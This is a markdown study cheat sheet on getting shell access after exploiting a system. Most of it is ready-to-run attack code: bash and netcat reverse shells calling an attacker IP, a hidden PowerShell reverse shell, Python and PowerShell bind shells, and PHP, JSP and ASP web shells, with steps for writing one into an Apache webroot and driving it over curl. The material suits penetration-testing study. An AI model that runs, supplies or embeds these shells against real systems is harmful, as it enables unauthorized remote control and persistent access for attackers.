# <h1 style="text-align:center">Shells</h1>

## Shell Types

Once an vulnerability has been exploited, our next goal is to create a reliable connection that gives us access to the sytems shell (i.e. ```Bash``` or ```PowerShell```). One way to achieve this is by using tools such as ```SSH``` on Linux or ```WinRM``` on Windows. However, to do this, we need credentials.

Another method is through shells. There are three main types of shells: Reverse Shell, Bind Shell, and Web Shell.

### Reverse Shell
Most common, quickest, and easiest method. We can start a netcat listener on our machine that listens on a specific port. With listener in place, we can execute a ```reverse shell command``` that connects the remote system shell (e.g. ```Bash```, ```PowerShell```) to our netcat listener, giving us a reverse connection over the remote system. 

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

* ```nc -lvnp <port number>``` - start a netcat listener on a port of our choosing.
* ```ip a``` - show our IP address. 

* ```bash -c 'bash -i >& /dev/tcp/<target_IP>/<port> 0>&1'``` - bash.
* ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f``` - bash.
* ```powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()``` - Windows PowerShell - replace IP and port number. 

### Bind Shell

A ```Bind Shell``` is connected to the targets' listenting port. Once executed, it will listen on a port on the remote host and bind to that host's shell to a port. We then connect to thata port with netcat. 

* ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f``` - bash code.
* ```python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'``` - python code.
* ```powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();``` - powershell code.

* ```nc <target_IP> <port>``` - connect to the shell via netcat.

Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.

#### Upgrading TTY

* ```python -c 'import pty; pty.spawn("/bin/bash")'``` - use Python within the netcat shell to upgrade the shell to full TTY.
* ```CTRL + z``` - background our shell and get back to local terminal, then:
    
        stty raww -echo
        fg

        [Enter]
        [Enter]

* ```echo $TERM``` - TERM variable.
* ```stty size``` - show rows and columns.
* ```export TERM=xterm-256color``` - add color.
* ```stty rows 67 columns 318``` - resize.

### Web Shell

A web shell is typically a web script, i.e. PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command and prints its output back on the web page. 

First of all, we need to write our web shell that would take our command through a GET request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:

* ```<?php system($_REQUEST["cmd"]); ?>``` - php code.
* ```<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>``` - jsp code.
* ```<% eval request("cmd") %>``` - asp code.

#### Uploading a Web Shell

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

* Apache - 	/var/www/html/
* Nginx	- /usr/local/nginx/html/
* IIS - c:\inetpub\wwwroot\
* XAMPP - C:\xampp\htdocs\

We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:

* ```echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php``` - bash code.

#### Accessing Web Shell

Once we write our web shell, we can either access it through a browser or by using cURL. We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command:

    http://SERVER_IP:PORT/shell.php?cmd=id

Or use cURL:

    curl http://SERVER_IP:PORT/shell.php?cmd=id

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.

On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.